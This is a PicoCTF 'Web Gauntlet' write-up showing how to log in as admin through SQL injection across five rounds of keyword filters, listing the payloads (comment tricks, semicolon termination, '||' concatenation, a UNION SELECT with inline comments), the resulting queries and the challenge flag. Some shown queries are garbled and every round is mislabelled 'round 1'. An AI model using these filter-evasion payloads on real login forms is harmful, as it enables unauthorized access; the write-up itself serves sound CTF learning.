---
title: "PicoCTF - Web Gauntlet"
author: r2cook
categories:
  - PicoCTF
tags:
  - SQLI
  - filter-bypass
render_with_liquid: false
media_subpath: /images/picoctf/
image:
  path: room_card.png
---

# Web Gauntlet

Platform: PicoCTF
Category: Web Exploitation  
Difficulty: Medium

---

## Description

Can you beat the filters? Log in as admin.

---

## Given Files / Access

- Files: None
    
- URL: [http://jupiter.challenges.picoctf.org:44979/](http://jupiter.challenges.picoctf.org:44979/)
    
- IP: jupiter.challenges.picoctf.org:44979
    

---

## Initial Recon / Enumeration

Commands / Tools:

- Browser (DevTools)
    
- Burp Suite (optional)
    
- View raw responses (hex when needed)
    

Notes:

- Application is a login form backed by SQLite.
    
- Error messages reveal the executed SQL query.
    
- Filters change each round (`filter.php` shows blocked keywords).
    
- Goal: bypass login and authenticate as `admin` without valid credentials.
    

📸 _[Insert Screenshot: Challenge UI Round 1]_  
📸 _[Insert Screenshot: Filter Page]_

---

## Analysis

تفكيرك وتحليلك للمشكلة.

- What is happening?
    
    - The backend builds SQL queries using unsanitized user input.
        
    - Each round adds keyword filters to block common SQL injection payloads.
        
- What is the vulnerability / trick?
    
    - Classic **SQL Injection** with filter evasion.
        
    - Use alternative SQL syntax (comments, concatenation, statement termination).
        
    - SQLite-specific tricks (e.g., `||` for concatenation, `/* */` comments).
        

---

## Exploitation / Solution

الخطوات الفعلية للحل:

### Round 1

Filters: `or`

1. Inject comment to bypass password:

	```sql
	admin' --
	```
    
2. Password field: anything
    

📸 _[Insert Screenshot: Round 1 Success]_

Final query to crack the round 1:

```sql
SELECT * FROM users WHERE username='admin' -- AND password='pass'
```

---

### Round 2

Filters: `or, and, like, =, --`

1. Use alternative comment style:
    
    ```sql
    admin' /*
    ```
    

📸 _[Insert Screenshot: Round 2 Success]_


Final query to crack the round 1:

```sql
SELECT * FROM users WHERE username='admin' /* AND password='pass'
```

---

### Round 3

Filters: `or, and, like, =, --, >, <`

1. Terminate query using semicolon:
    
    ```sql
    admin';
    ```
    

📸 _[Insert Screenshot: Round 3 Success]_

Final query to crack the round 1:

```sql
SELECT * FROM users WHERE username='admin'; AND password='pass'
```

---

### Round 4

Filters: `or, and, like, =, --, >, <, admin`

1. Now, the **_admin_** keyword is blocked. To bypass this, we use SQLite’s **concatenation operator (**`||`**)** to reconstruct the word **_admin_**:
    
    ```sql
    ad'||'min';
    ```
    

📸 _[Insert Screenshot: Round 4 Success]_

Final query to crack the round 1:

```sql
SELECT * FROM users WHERE username=ad'||'min'; AND password='pass'
```

Alternative:

```sql
'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;
```

---

### Round 5

Filters: `or, and, like, =, --, >, <, admin, union`

1. Reuse concatenation trick:
    
    ```sql
    ad'||'min';
    ```
    

📸 _[Insert Screenshot: Final Round Success]_

Final query to crack the round 1:

```sql
SELECT * FROM users WHERE username=ad'||'min'; AND password='pass'
```

then we go to `filter.php` refresh and we can see the flag at the bottom 

---

## Flag

```css
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

---